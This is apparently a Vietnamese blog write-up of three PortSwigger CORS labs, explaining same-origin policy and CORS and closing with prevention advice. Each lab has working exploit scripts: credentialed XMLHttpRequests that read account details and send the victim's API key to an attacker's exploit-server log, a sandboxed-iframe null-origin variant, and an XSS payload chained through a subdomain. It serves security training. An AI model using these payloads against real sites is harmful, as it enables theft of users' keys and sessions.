---
title: "[PortSwigger Lab] - Cross Origin Resource Sharing (CORS)"
description: Solution of Cross Origin Resource Sharing (CORS) on PortSwigger Lab
date: 2025-06-07 20:46:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, cors]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-07-portswigger-lab-cors/cors.png
    alt: Cross Origin Resource Sharing (CORS)
---

## Introduction
---
### **Same-Origin Policy (SOP)**
**Same-Origin Policy** là một cơ chế bảo mật của trình duyệt được thiết kế để ngăn chặn các **website** khác nhau truy cập trái phép dữ liệu của nhau. Mục tiêu chính của nó là ngăn các cuộc tấn công **cross-site**, chẳng hạn như đánh cắp thông tin người dùng từ một **website** khác mà người dùng đang đăng nhập.

```
Origin = protocol (scheme) + domain + port
```

- **URL:** `http://normal-website.com/example/example.html`
    - **Scheme:** http
    - **Domain:** normal-website.com
    - **Port:** 80 (mặc định cho HTTP)

- Tại sao **SOP** là cần thiết?
    - Khi bạn truy cập vào một trang web (ví dụ **Facebook**), trình duyệt sẽ tự động gửi **cookie** xác thực trong các **request** đến **Facebook**.
    - Nếu không có **SOP**, một trang **web** độc hại **(malicious site)** có thể gửi yêu cầu đến **Facebook** bằng **session** của bạn, đọc nội dung trả về, ví dụ: `tin nhắn`, `email`, `v.v.`

=> Điều này sẽ vi phạm nghiêm trọng quyền riêng tư và bảo mật.

- **Cookies** và **SOP**
    - **SOP** lỏng lẻo hơn với **cookies**.
    - **Cookies** thường được chia sẻ giữa các **subdomain** (như a.example.com và b.example.com).
    - Có thể dùng flag **HttpOnly** để bảo vệ **cookie** khỏi bị truy cập bởi **JavaScript**.

### **Cross Site Resource Sharing (CORS)**
**CORS** là một cơ chế bảo mật của trình duyệt, cho phép một **website** truy cập tài nguyên từ một **domain** khác **(cross-origin)** một cách có kiểm soát, thông qua các **HTTP header** đặc biệt do **server** trả về.

**CORS** là cách mà trình duyệt nới lỏng **Same-Origin Policy (SOP)** một cách an toàn.

- **Access-Control-Allow-Origin** là **header** trong phản hồi từ **server**, cho biết **origin** nào được phép truy cập nội dung phản hồi từ **server** đó.
- **CORS** với **credentials** (**cookie**, **Authorization header**, **client certificates**)
    - Mặc định, **CORS** không gửi **credentials** (**cookie**, **Authorization**...) theo **request**.
    - Muốn gửi được **credentials**:
        - Client phải dùng `fetch(..., { credentials: 'include' })`
        - Server phải gửi thêm:

```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: <specific origin>
```

## Solve CORS Lab
---

| Thành phần                         | Giá trị phản ánh lỗi                              |
| ---------------------------------- | ------------------------------------------------- |
| `Access-Control-Allow-Origin`      | Phản chiếu lại bất kỳ `Origin` gửi lên            |
| `Access-Control-Allow-Credentials` | `true` (cho phép cookie được gửi đi và dùng)      |

### Lab: CORS vulnerability with basic origin reflection
#### Analysis
- Login bằng tài khoản được cấp 
- Mở **Proxy** > **HTTP History** của **Burp**
- Tìm request **AJAX** gửi đến `/accountDetails`, thấy response có header `Access-Control-Allow-Credentials: true` => Gợi ý rằng **server** có hỗ trợ **CORS**.
- Thêm header `Origin: https://evil.com` trong request để test server có **reflect Origin** không
- Server phản hồi `Access-Control-Allow-Origin: https://evil.com` => **reflect Origin**

=> Như này tất cả các request sẽ được trình duyệt chấp nhận 

#### Exploit
- Tạo script gửi đến victim
```html
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('GET', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
        req.withCredentials = true;  // Cho phép gửi cookie 
        req.send();

        function reqListener() {
            // Gửi kết quả (API key) về attacker (qua đường dẫn /log)
            location = '/log?key=' + this.responseText;
        };
    </script>
```
- Khi victim truy cập vào trang web của attacker, script trên được thực thi, theo hành vi mặc định, **browser** thêm **header Origin: evil.com** vào request, trong trường hợp này:
    - Server phản hồi lại `Access-Control-Allow-Origin: evil.com` và `Access-Control-Allow-Credentials: true`
    - Vì vậy request thành công khi server chấp nhận **Origin** và **cookie** từ **browser**
- Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit

### CORS vulnerability with trusted null origin
#### Analysis
- Login bằng tài khoản được cấp 
- Mở **Proxy** > **HTTP History** của **Burp**
- Tìm request **AJAX** gửi đến `/accountDetails`, thấy response có header `Access-Control-Allow-Credentials: true` => Gợi ý rằng **server** có hỗ trợ **CORS**.
- Thêm header `Origin: https://evil.com` trong request để test server có **reflect Origin** không => Không
- Thêm header `Origin: https://YOUR-LAB-ID.web-security-academy.net` trong request để test server có **reflect Origin** không => Có
- Thêm header `Origin: null` trong request để test server có **reflect Origin** không => Có

=> Server chấp nhận cùng **origin** và **null** trong **while list**
#### Exploit
- Ý tưởng: Sử dụng kỹ thuật tấn công với `Origin: null` và **iframe sandbox**
- Tạo mã khai thác và gửi đến victim

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
    src="data:text/html,<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://0ad5002f03f83ae3b5d42fbe00c30040.web-security-academy.net/accountDetails',true);
        req.withCredentials = true;
        req.send();

        function reqListener() {
            location='https://exploit-0a5000f803e43a46b5f22ed0016300f2.exploit-server.net/log?key='+this.responseText;
        };
    </script>">
</iframe>
```

| Quyền                  | Tác dụng                                                               | Nguy cơ                                                                                                   |
| ---------------------- | ---------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| `allow-scripts`        | Cho phép iframe chạy JavaScript.                                       | Nhưng **JS không được truy cập DOM cha**, và origin là `"null"` nếu sandbox không có `allow-same-origin`. |
| `allow-top-navigation` | Cho phép iframe điều hướng top-level (thay đổi `window.top.location`). | Có thể dùng để redirect người dùng.                                                                       |
| `allow-forms`          | Cho phép gửi form (POST, GET...).                                      | Có thể gửi request, nhưng không đọc được phản hồi nếu bị CORS chặn.                                       |

- Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit

### CORS vulnerability with trusted insecure protocols
#### Analysis
- Login bằng tài khoản được cấp 
- Mở **Proxy** > **HTTP History** của **Burp**
- Tìm request **AJAX** gửi đến `/accountDetails`, thấy response có header `Access-Control-Allow-Credentials: true` => Gợi ý rằng **server** có hỗ trợ **CORS**.
- Thử thêm **header Origin** khác nhau để test hành vi của **server** => chỉ chấp nhận cùng **origin** và bất kết **scheme** nào
- Thử khai thác thêm: 
    - Vào 1 post bất kỳ
    - Checkstock => xuất hiện 1 subdomain
    - Thử khai thác XSS và thành công với payload: `https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net/?productId=%3Cimg%20src=1%20onerror=alert()%3E&storeId=acb`
- Thử thay giá trị **header Origin** thành `https://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net` và thành công => origin được server tin cậy

#### Exploit
- Ý tưởng: Từ lỗi XSS ở subdomain, tạo script đế tấn công lấy **apikey**
- Mã trong phần body của **Exploit Server**
```html
<script>
    document.location="http://stock.0a3b002d04976b6e81260c3a00900075.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a3b002d04976b6e81260c3a00900075.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() {location='https://exploit-0acf00f004266b3481b80b3b01a20006.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>&storeId=1"
</script>
```
- Deliver to victim
- Lấy **apikey** trong `/log` của **Exploit Server**, **smart decode** và submit

## Prevent
---
### Proper configuration of cross-origin requests 
Nếu tài nguyên có thông tin nhạy cảm, chỉ nên cho phép origin tin cậy trong header:
**Access-Control-Allow-Origin:** `https://trusted-site.com`
### Only allow trusted sites 
Không nên phản chiếu **(reflect)** origin request một cách động không kiểm soát vì dễ bị lợi dụng.
### Avoid whitelisting null
**Access-Control-Allow-Origin:** `null` có thể cho phép các request **sandbox** hoặc từ tài liệu nội bộ. Nên tránh dùng.
### Avoid wildcards (*) in internal networks
Wildcard trong mạng nội bộ tạo lỗ hổng, vì dựa vào cấu hình mạng để bảo vệ không đủ, nếu trình duyệt nội bộ truy cập từ các domain không tin cậy bên ngoài.
### CORS is not a substitute for server-side security policies
- **CORS** chỉ là rào cản do trình duyệt áp dụng. **Server** vẫn phải kiểm soát chặt authentication, phân quyền, session,...
- Kẻ tấn công có thể gửi request giả mạo **(forged request)** trực tiếp tới server từ origin hợp lệ.

---
Goodluck! 🍀🍀🍀 